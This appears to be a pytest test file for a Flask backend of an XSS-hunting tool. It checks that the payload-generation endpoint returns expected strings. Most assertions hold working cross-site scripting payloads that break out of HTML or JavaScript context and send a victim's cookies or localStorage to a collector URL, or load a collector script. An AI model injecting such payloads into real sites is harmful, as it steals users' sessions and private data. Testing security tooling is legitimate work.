from app.api.models import XssGenerateModel
from app.api.xss import _generate_collector_payload_body, _generate_js_grabber_payload_elements
from flask.testing import FlaskClient
from tests.helpers import create_client, login


def test__xss_generate__given_html_collector__then_payload_returned(client_tester: FlaskClient):
    create_client("test", uid="abcdef")
    access_token, refresh_token = login(client_tester, "admin", "xss")
    response = client_tester.post(
        "/api/xss/generate",
        json={"client_id": 1, "url": "http://127.0.0.1", "xss_type": "s", "code_type": "html", "to_gather": ["dom"], "tags": ["tag1"]},
        headers={"Authorization": f"Bearer {access_token}"},
    )
    assert response.json == {
        "payload": '\'>"><script src=http://127.0.0.1/static/collector.min.js data="cyxhYmNkZWYsY29va2llcztmaW5nZXJwcmludDtsb2NhbF9zdG9yYWdlO29yaWdpbl91cmw7cmVmZXJyZXI7c2NyZWVuc2hvdDtzZXNzaW9uX3N0b3JhZ2UsdGFnMQ=="></script>'
    }
    assert response.status_code == 200


def test__xss_generate__given_html_js_grabber__when_tags__then_payload_returned(client_tester: FlaskClient):
    create_client("test", uid="abcdef")
    access_token, refresh_token = login(client_tester, "admin", "xss")
    response = client_tester.post(
        "/api/xss/generate",
        json={"client_id": 1, "url": "http://127.0.0.1", "xss_type": "s", "code_type": "html", "to_gather": ["cookies"], "tags": ["tag1"]},
        headers={"Authorization": f"Bearer {access_token}"},
    )
    assert response.json == {
        "payload": '\'>"><script>new Image().src="http://127.0.0.1/api/x/s/abcdef?tags=tag1&cookies="+encodeURIComponent(document.cookie)</script>'
    }


def test__xss_generate__given_html_js_grabber__when_no_tags__then_payload_returned(client_tester: FlaskClient):
    create_client("test", uid="abcdef")
    access_token, refresh_token = login(client_tester, "admin", "xss")
    response = client_tester.post(
        "/api/xss/generate",
        json={"client_id": 1, "url": "http://127.0.0.1", "xss_type": "s", "code_type": "html", "to_gather": ["cookies"], "tags": []},
        headers={"Authorization": f"Bearer {access_token}"},
    )
    assert response.json == {"payload": '\'>"><script>new Image().src="http://127.0.0.1/api/x/s/abcdef?cookies="+encodeURIComponent(document.cookie)</script>'}


def test__xss_generate__given_html_no_js__when_tags__then_payload_returned(client_tester: FlaskClient):
    create_client("test", uid="abcdef")
    access_token, refresh_token = login(client_tester, "admin", "xss")
    response = client_tester.post(
        "/api/xss/generate",
        json={"client_id": 1, "url": "http://127.0.0.1", "xss_type": "s", "code_type": "html", "to_gather": [], "tags": ["tag1"]},
        headers={"Authorization": f"Bearer {access_token}"},
    )
    assert response.json == {"payload": '\'>"><img src="http://127.0.0.1/api/x/s/abcdef?tags=tag1" />'}


def test__xss_generate__given_html_no_js__when_no_tags__then_payload_returned(client_tester: FlaskClient):
    create_client("test", uid="abcdef")
    access_token, refresh_token = login(client_tester, "admin", "xss")
    response = client_tester.post(
        "/api/xss/generate",
        json={"client_id": 1, "url": "http://127.0.0.1", "xss_type": "s", "code_type": "html", "to_gather": [], "tags": []},
        headers={"Authorization": f"Bearer {access_token}"},
    )
    assert response.json == {"payload": '\'>"><img src="http://127.0.0.1/api/x/s/abcdef" />'}


def test__xss_generate__given_js_collector__then_payload_returned(client_tester: FlaskClient):
    create_client("test", uid="abcdef")
    access_token, refresh_token = login(client_tester, "admin", "xss")
    response = client_tester.post(
        "/api/xss/generate",
        json={"client_id": 1, "url": "http://127.0.0.1", "xss_type": "s", "code_type": "js", "to_gather": ["dom"], "tags": ["tag1"]},
        headers={"Authorization": f"Bearer {access_token}"},
    )
    assert response.json == {
        "payload": ';};var js=document.createElement("script");js.src="http://127.0.0.1/static/collector.min.js";js.setAttribute("data", "cyxhYmNkZWYsY29va2llcztmaW5nZXJwcmludDtsb2NhbF9zdG9yYWdlO29yaWdpbl91cmw7cmVmZXJyZXI7c2NyZWVuc2hvdDtzZXNzaW9uX3N0b3JhZ2UsdGFnMQ==");document.body.appendChild(js);'
    }


def test__xss_generate__given_js_js_grabber__when_js_capture_and_tags__then_payload_returned(client_tester: FlaskClient):
    create_client("test", uid="abcdef")
    access_token, refresh_token = login(client_tester, "admin", "xss")
    response = client_tester.post(
        "/api/xss/generate",
        json={"client_id": 1, "url": "http://127.0.0.1", "xss_type": "s", "code_type": "js", "to_gather": ["cookies"], "tags": ["tag1"]},
        headers={"Authorization": f"Bearer {access_token}"},
    )
    assert response.json == {"payload": ';};new Image().src="http://127.0.0.1/api/x/s/abcdef?tags=tag1&cookies="+encodeURIComponent(document.cookie);'}


def test__xss_generate__given_js_js_grabber__when_js_capture_and_no_tags__then_payload_returned(client_tester: FlaskClient):
    create_client("test", uid="abcdef")
    access_token, refresh_token = login(client_tester, "admin", "xss")
    response = client_tester.post(
        "/api/xss/generate",
        json={"client_id": 1, "url": "http://127.0.0.1", "xss_type": "s", "code_type": "js", "to_gather": ["cookies"], "tags": []},
        headers={"Authorization": f"Bearer {access_token}"},
    )
    assert response.json == {"payload": ';};new Image().src="http://127.0.0.1/api/x/s/abcdef?cookies="+encodeURIComponent(document.cookie);'}


def test__xss_generate__given_js_js_grabber__when_tags_and_no_js_capture__then_payload_returned(client_tester: FlaskClient):
    create_client("test", uid="abcdef")
    access_token, refresh_token = login(client_tester, "admin", "xss")
    response = client_tester.post(
        "/api/xss/generate",
        json={"client_id": 1, "url": "http://127.0.0.1", "xss_type": "s", "code_type": "js", "to_gather": [], "tags": ["tag1"]},
        headers={"Authorization": f"Bearer {access_token}"},
    )
    assert response.json == {"payload": ';};new Image().src="http://127.0.0.1/api/x/s/abcdef?tags=tag1";'}


def test__xss_generate__given_js_js_grabber__when_no_js_capture_and_no_tags__then_payload_returned(client_tester: FlaskClient):
    create_client("test", uid="abcdef")
    access_token, refresh_token = login(client_tester, "admin", "xss")
    response = client_tester.post(
        "/api/xss/generate",
        json={"client_id": 1, "url": "http://127.0.0.1", "xss_type": "s", "code_type": "js", "to_gather": [], "tags": []},
        headers={"Authorization": f"Bearer {access_token}"},
    )
    assert response.json == {"payload": ';};new Image().src="http://127.0.0.1/api/x/s/abcdef?";'}


def test__xss_generate__given_request__when_bad_to_gather__then_400_returned(client_tester: FlaskClient):
    access_token, refresh_token = login(client_tester, "admin", "xss")
    response = client_tester.post(
        "/api/xss/generate",
        json={"client_id": 1, "url": "http://127.0.0.1", "xss_type": "s", "code_type": "js", "to_gather": ["bad"], "tags": []},
        headers={"Authorization": f"Bearer {access_token}"},
    )
    assert response.status_code == 400


def test___generate_collector_payload_body__given_body_and_client__then_payload_body_returned(client_tester: FlaskClient):
    client = create_client("test", uid="abcdef")
    body = XssGenerateModel(client_id=1, url="http://127.0.0.1", xss_type="r", code_type="html", to_gather=["local_storage"], tags=["tag1"])
    payload_body = _generate_collector_payload_body(body, client)
    assert payload_body == "cixhYmNkZWYsY29va2llcztkb207ZmluZ2VycHJpbnQ7b3JpZ2luX3VybDtyZWZlcnJlcjtzY3JlZW5zaG90O3Nlc3Npb25fc3RvcmFnZSx0YWcx"


def test___generate_js_grabber_payload_elements__given_body__when_tags__then_tags_and_payload_returned(client_tester: FlaskClient):
    body = XssGenerateModel(client_id=1, url="http://127.0.0.1", xss_type="r", code_type="html", to_gather=["local_storage"], tags=["tag1"])
    tags_query_param, joined_and_trimmed_selected_payloads = _generate_js_grabber_payload_elements(body)
    assert tags_query_param == "tags=tag1"
    assert joined_and_trimmed_selected_payloads == 'local_storage="+encodeURIComponent(JSON.stringify(localStorage))'


def test___generate_js_grabber_payload_elements__given_body__when_no_tags__then_tags_and_payload_returned(client_tester: FlaskClient):
    body = XssGenerateModel(client_id=1, url="http://127.0.0.1", xss_type="r", code_type="html", to_gather=["local_storage"], tags=[])
    tags_query_param, joined_and_trimmed_selected_payloads = _generate_js_grabber_payload_elements(body)
    assert tags_query_param == ""
    assert joined_and_trimmed_selected_payloads == 'local_storage="+encodeURIComponent(JSON.stringify(localStorage))'
